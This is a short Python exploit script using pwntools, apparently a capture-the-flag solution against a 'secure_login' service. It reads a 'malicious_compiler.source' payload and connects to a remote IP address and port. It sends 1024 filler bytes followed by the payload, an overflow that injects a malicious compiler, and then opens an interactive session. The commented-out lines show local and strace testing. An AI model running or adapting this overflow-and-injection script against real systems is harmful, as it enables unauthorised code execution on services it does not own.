#!/usr/bin/env python3

from pwn import *
import base64


'''
with open("malicious_compiler.textbin", "rb") as f:
    malicious_compiler_textbin = f.read()

assert(len(malicious_compiler_textbin) <= 635)
malicious_compiler_source = base64.b64encode(malicious_compiler_textbin.ljust(635))    # ensure the size is same as origin mycompiler_binary_len
'''

with open("malicious_compiler.source", "rb") as f:
    malicious_compiler_source = f.read()
assert len(malicious_compiler_source) <= 848

#s = process(["strace", "-f" ,"../src/secure_login"])
#s = process("../src/secure_login")
#s = process("cd ../src ; ./secure_login", shell=True)
#s = remote("localhost", 12345)
s = remote("42.192.189.71", 32021)

s.sendline(b"a"*1024+malicious_compiler_source)

s.interactive()

